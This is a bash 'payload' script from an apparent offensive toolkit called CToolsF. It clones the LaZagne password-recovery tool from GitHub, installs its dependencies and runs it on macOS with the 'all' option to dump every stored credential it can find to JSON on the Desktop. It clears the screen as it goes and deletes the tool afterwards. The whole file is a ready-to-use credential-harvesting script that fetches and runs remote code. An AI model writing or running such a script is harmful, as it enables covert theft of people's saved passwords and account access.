# This script is a part of CToolsF library.
# Author is not responsible for any malicious activities that can be committed by using any of contents of this library.

#!/bin/bash


payload() {
    if [ "$1" == "verbose" ]; then
        printf "\033[33m[*]\033[0m Preparing payload...\n"
    fi
    if ! git --version; then
        if [ "$1" == "verbose" ]; then
            printf "\033[31m[*]\033[0m Git not installed.\n"
        else
            clear
        fi
        exit 1
    else
        if ! pip3 --version; then
            if [ "$1" == "verbose" ]; then
                printf "\033[31m[*]\033[0m Pip3 not installed.\n"
            else
                clear
            fi
            exit 1
        else
            if [ "$1" == "verbose" ]; then
                printf "\033[33m[*]\033[0m Downloading LaZagne...\n"
            else
                clear
            fi
            cd $HOME
            if ! git clone https://github.com/AlessandroZ/LaZagne; then
                if [ "$1" == "verbose" ]; then
                    printf "\033[31m[*]\033[0m Unable to download LaZagne.\n"
                else
                    clear
                fi
                exit 1
            else
                if [ "$1" == "verbose" ]; then
                    printf "\033[33m[*]\033[0m Preparing to run scripts...\n"
                else
                    clear
                fi
                pip3 install -r LaZagne/requirements.txt
                if [ "$1" == "verbose" ]; then
                    printf "\033[33m[*]\033[0m Running scripts...\n"
                else
                    clear
                fi
                python3 LaZagne/Mac/laZagne.py all -oJ -output $HOME/Desktop
                # # #
                if [ "$1" == "verbose" ]; then
                    printf "\033[33m[*]\033[0m Removing files...\n"
                else
                    clear
                fi
                rm -rf LaZagne
                if [ "$1" == "verbose" ]; then
                    printf "\033[32m[*]\033[0m Done.\n"
                else
                    clear
                fi
                exit 0
            fi
        fi
    fi
}


case "$1" in
    "verbose" )
        payload
        ;;
    "token" )
        payload
        ;;
    "" )
        payload
        ;;
    * )
        printf "\033[31m[*]\033[0m Invalid argument(s) specified.\n"
        exit 1
esac
